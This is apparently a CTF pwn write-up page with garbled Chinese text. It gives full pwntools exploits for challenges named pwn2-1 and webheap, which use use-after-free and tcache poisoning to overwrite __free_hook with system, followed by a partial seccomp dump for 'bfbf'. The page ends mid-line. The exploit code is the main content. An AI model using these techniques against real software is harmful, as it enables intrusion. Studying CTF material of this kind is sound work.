<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn2-1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.20&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1B0A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">ch</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Note size :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content :&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice :let us give you some tips\n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">pro_base = leak_addr - <span class="number">0x11f0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">catflag = <span class="number">0x1B70</span>+pro_base</span><br><span class="line">chunk_list = <span class="number">0x40A0</span>+pro_base</span><br><span class="line">success(<span class="string">&quot;chunk_list &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(chunk_list))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,p64(catflag))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="webheap"><a href="#webheap" class="headerlink" title="webheap"></a>webheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.4</span>)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webheap: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">27</span>dde4c970e713a66d152d11040e93cccb362625, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64‰ΩçÔºådynamicallyÔºåÂÖ®ÂºÄ</li>
</ul>
<p><strong>cpp ÂèçÂ∫èÂàóÂåñ -&gt; python Â∫èÂàóÂåñ</strong></p>
<p>Á®ãÂ∫èÂÆûÁé∞‰∫ÜÂèçÂ∫èÂàóÂåñËØªÂÖ•</p>
<ul>
<li>ÂÜÖÂ≠òÈáåÂ≠òÁöÑÊï∞ÊçÆ‰∏çÈÄöÁî®Ôºå‰∏çÂêåÁ≥ªÁªü‰∏çÂêåËØ≠Ë®ÄÁöÑÁªÑÁªáÂèØËÉΩÈÉΩÊòØ‰∏ç‰∏ÄÊ†∑ÁöÑ</li>
<li>Â∫èÂàóÂåñÁöÑ‰∫åËøõÂà∂Êï∞ÊçÆÊòØÈÄöËøá‰∏ÄÂÆöÁöÑÂçèËÆÆÂ∞ÜÊï∞ÊçÆÂ≠óÊÆµËøõË°åÊãºÊé•<ul>
<li>Á¨¨‰∏Ä‰∏™‰ºòÂäøÊòØÔºö‰∏çÂêåÁöÑËØ≠Ë®ÄÈÉΩÂèØ‰ª•ÈÅµÂæ™ËøôÁßçÂçèËÆÆËøõË°åËß£ÊûêÔºåÂÆûÁé∞‰∫ÜË∑®ËØ≠Ë®Ä</li>
<li>Á¨¨‰∫å‰∏™‰ºòÂäøÊòØÔºöËøôÁßçÊï∞ÊçÆÂèØ‰ª•Áõ¥Êé•ÊåÅ‰πÖÂåñÂà∞Á£ÅÁõòÔºå‰ªéÁ£ÅÁõòËØªÂèñÂêé‰πüÂèØ‰ª•ÈÄöËøáËøô‰∏™ÂçèËÆÆËß£ÊûêÂá∫Êù•</li>
</ul>
</li>
</ul>
<p>Â¶ÇÊûúË¶ÅÊÉ≥‰ΩøÁî®ÁΩëÁªúÊ°ÜÊû∂ÁöÑ API Êù•‰º†ËæìÁªìÊûÑÂåñÁöÑÊï∞ÊçÆÔºåÂøÖÈ°ªÂæóÂÖàÂÆûÁé∞ [ÁªìÊûÑÂåñÁöÑÊï∞ÊçÆ] ‰∏é [Â≠óËäÇÊµÅ] ‰πãÈó¥ÁöÑÂèåÂêëËΩ¨Êç¢ÔºåËøôÁßçÂ∞ÜÁªìÊûÑÂåñÊï∞ÊçÆËΩ¨Êç¢ÊàêÂ≠óËäÇÊµÅÁöÑËøáÁ®ãÔºåÁß∞‰∏∫Â∫èÂàóÂåñÔºåÂèçËøáÊù•ËΩ¨Êç¢ÔºåÂ∞±ÊòØÂèçÂ∫èÂàóÂåñ</p>
<p>Êú¨È¢òÁõÆÁî® cpp Êù•ÂÆûÁé∞ÂèçÂ∫èÂàóÂåñÔºåÈöæÁÇπÂ∞±Âú®ÈÄÜÂêëÁöÑËøáÁ®ãÔºåË¶ÅÂú®‰∏ÄÂ†ÜÂæàÈöæÁúãÁöÑ cpp ‰ª£Á†Å‰∏≠ÊâæÂà∞‚ÄúÁºñÁ†ÅÊ†ºÂºè‚ÄùÔºàÁõÆÊ†áÂú∞ÂùÄ‰∏∫‚Äú0x45A8‚ÄùÔºâ</p>
<ul>
<li>ÊàëÂØπ‰∫é cpp ÁöÑÈÄÜÂêë‰∏çÊòØÂæàÁÜüÊÇâÔºå‰ΩÜÂú®ÊØîËµõÁöÑËøáÁ®ã‰∏≠‰πüÊî∂Ëé∑‰∫Ü‰∏Ä‰∫õ cpp ÁöÑÈÄÜÂêëÊäÄÂ∑ßÔºà‰πãÂêéÊÄªÁªì‰∏Ä‰∏ãÔºâ</li>
<li>‰ª•ÂêéÊúâÊú∫‰ºöÂÜô‰∏Ä‰∏™ÂèçÂ∫èÂàóÂåñÁöÑ cpp Á®ãÂ∫èÔºåÁÑ∂ÂêéÊãñ IDA ÂàÜÊûê‰∏Ä‰∏ã</li>
</ul>
<p>ËøôÁßçÈ¢òÁõÆÁöÑÂÖ≥ÈîÆÂ∞±Âú®‰∫éÔºöÊ†πÊçÆÂèçÂ∫èÂàóÂåñÁöÑ‰ª£Á†ÅÔºåÊù•Êé®ÂØºÂÆûÁé∞Â∫èÂàóÂåñÁöÑ python ËÑöÊú¨</p>
<p><strong>ÊºèÊ¥ûÂàÜÊûê</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">dele</span><span class="params">(<span class="keyword">unsigned</span> __int64 index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_list[index]);              <span class="comment">// UAF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Êúâ UAF</li>
</ul>
<p><strong>ÂÖ•‰æµÊÄùË∑Ø</strong></p>
<p>ÂΩìÈÄÜÂêëÂ∑•‰ΩúÂÆåÊàê‰πãÂêéÔºåÂèØ‰ª•Ê†πÊçÆÁ®ãÂ∫èÁöÑÂèçÂ∫èÂàóÂåñËøáÁ®ãÔºåÂÜôÂá∫Â∫èÂàóÂåñÁöÑËÑöÊú¨Ôºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setuint</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x&gt;=<span class="number">0</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7f</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x80</span>)+p8(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x80</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x81</span>)+p16(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x8000</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x82</span>)+p32(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x80000000</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fffffffffffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x83</span>)+p64(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setint</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">and</span> x &lt;= <span class="number">0xff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x84</span>)+p8(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x100</span> <span class="keyword">and</span> x&lt;=<span class="number">0xffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x85</span>)+p16(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x10000</span> <span class="keyword">and</span> x&lt;=<span class="number">0xffffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x86</span>)+p32(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_code</span>(<span class="params">op, idx, size, num1,num2</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xb9</span>) + p8(<span class="number">0x05</span>)</span><br><span class="line">    payload += setint(op) + setuint(idx) +setuint(size) + <span class="string">&#x27;\xBD&#x27;</span>+setuint(num1)+p8(<span class="number">0</span>)+setuint(num2)</span><br><span class="line">    sla(<span class="string">&#x27;Packet length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    sa(<span class="string">&#x27;Content:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">0</span>,idx,size,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">1</span>,idx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">2</span>,idx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xb9</span>) + p8(<span class="number">0x05</span>)</span><br><span class="line">    payload += p8(<span class="number">3</span>) +p8(idx) + p8(<span class="number">0x30</span>) + <span class="string">&#x27;\xBD&#x27;</span>+p8(<span class="number">6</span>)+p64(cont)</span><br><span class="line">    sla(<span class="string">&#x27;Packet length: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    sa(<span class="string">&#x27;Content:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>
<p>Âà©Áî® UAF ÂÆåÊàêÊ≥ÑÈú≤‰ª•ÂêéÔºåÂ∞±Êâì tcache attackÔºåÂ∞ùËØïÁî≥ËØ∑ <code>free_hook</code>ÔºåÁÑ∂Âêé‰øÆÊîπ‰∏∫ <code>system</code> Â∞±ÂèØ‰ª•‰∫Ü</p>
<p>ÂÆåÊï¥ exp Â¶Ç‰∏ãÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./webheap&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chuj.top&#x27;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* \n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x4918)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setuint</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x&gt;=<span class="number">0</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7f</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x80</span>)+p8(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x80</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x81</span>)+p16(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x8000</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x82</span>)+p32(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x80000000</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fffffffffffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x83</span>)+p64(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setint</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">and</span> x &lt;= <span class="number">0xff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x84</span>)+p8(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x100</span> <span class="keyword">and</span> x&lt;=<span class="number">0xffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x85</span>)+p16(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x10000</span> <span class="keyword">and</span> x&lt;=<span class="number">0xffffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x86</span>)+p32(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_code</span>(<span class="params">op, idx, size, num1,num2</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xb9</span>) + p8(<span class="number">0x05</span>)</span><br><span class="line">    payload += setint(op) + setuint(idx) +setuint(size) + <span class="string">&#x27;\xBD&#x27;</span>+setuint(num1)+p8(<span class="number">0</span>)+setuint(num2)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Packet length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">0</span>,idx,size,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">1</span>,idx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">2</span>,idx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xb9</span>) + p8(<span class="number">0x05</span>)</span><br><span class="line">    payload += p8(<span class="number">3</span>) +p8(idx) + p8(<span class="number">0x30</span>) + <span class="string">&#x27;\xBD&#x27;</span>+p8(<span class="number">6</span>)+p64(cont)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Packet length: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libcbase=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">one_gadget = libcbase + one_gadgets[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libcbase &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,free_hook)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x30</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x6873</span>)</span><br><span class="line">edit(<span class="number">3</span>,system)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bfbf"><a href="#bfbf" class="headerlink" title="bfbf"></a>bfbf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.8</span>)</span> stable release version 2.31.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=e3bffe1cec71dcd6694ca6bd031a59f4855b9b86, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64‰ΩçÔºådynamicallyÔºåÂÖ®ÂºÄ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0006</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x20</span> <span 